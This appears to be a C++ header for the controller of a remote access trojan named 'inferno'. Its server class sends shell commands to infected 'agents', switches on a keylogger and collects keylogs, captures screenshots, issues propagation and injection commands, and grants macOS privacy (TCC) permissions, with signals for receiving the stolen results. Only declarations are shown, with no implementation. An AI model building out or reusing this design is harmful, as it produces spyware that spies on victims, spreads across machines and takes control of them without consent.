#pragma once

#include "../../common/include/Socket.hpp"
#include <QObject>
#include <QString>
#include <QVector>
#include <vector>
#include <cstdint>
#include <ctime>

namespace inferno {

class Server : public QObject {
    Q_OBJECT
public:
    struct ClientContext {
        Socket socket;
        std::vector<uint8_t> buffer;
    };

    // Coplien
    explicit Server(uint16_t port = 0, QObject* parent = nullptr);
    ~Server() override;
    Server(const Server&)            = delete;
    Server& operator=(const Server&) = delete;

    // Core
    bool start();  // bind + listen
    void run();    // select() loop
    void stop();

    // Command Dispatch (Thread-safe slots)
    void sendShellCommand(const QString& ip, const QString& cmd);
    void requestProcessList(const QString& ip);
    void toggleKeylogger(const QString& ip, bool active);
    void requestKeylogDump(const QString& ip);
    void disconnectAgent(const QString& ip);
    void sendPropagationCommand(const QString& ip, uint8_t cmd, const QString& target);
    void sendInjectCommand(const QString& ip, const QString& targetPath);
    void sendScreenshotCommand(const QString& ip, uint8_t subtype = 1);
    void sendTccGrantCommand(const QString& ip, const QString& bundleId);

    // Getters
    [[nodiscard]] bool     isRunning() const;
    [[nodiscard]] uint16_t getPort()   const;

signals:
    void agentConnected(const QString& ip, const QString& info);
    void agentDisconnected(const QString& ip);
    void shellOutputReceived(const QString& ip, const QString& output);
    void processListReceived(const QString& ip, const QString& output);
    void keylogReceived(const QString& ip, const QString& data);
    void propagationResultReceived(const QString& ip, const QString& result);
    void scanResultReceived(const QString& ip, const QString& report);
    void injectResultReceived(const QString& ip, bool success, const QString& targetPath);
    void screenshotReceived(const QString& ip, const QByteArray& jpeg,
                            int width, int height, bool success);
    void tccGrantResultReceived(const QString& ip, const QString& bundleId,
                                bool success);
    void statusMessage(const QString& message);

private:
    void processPacketBuffer(ClientContext& client);

private:
    Socket                     m_listen_socket; 
    std::vector<ClientContext> m_clients;       
    uint16_t                   m_port;
    bool                       m_running;
    time_t                     m_last_heartbeat;

    static std::string buildCmdExecPacket(const std::string& command);
    static std::string sanitizeOutput(const std::string& s, size_t offset, size_t len);
};

} // namespace inferno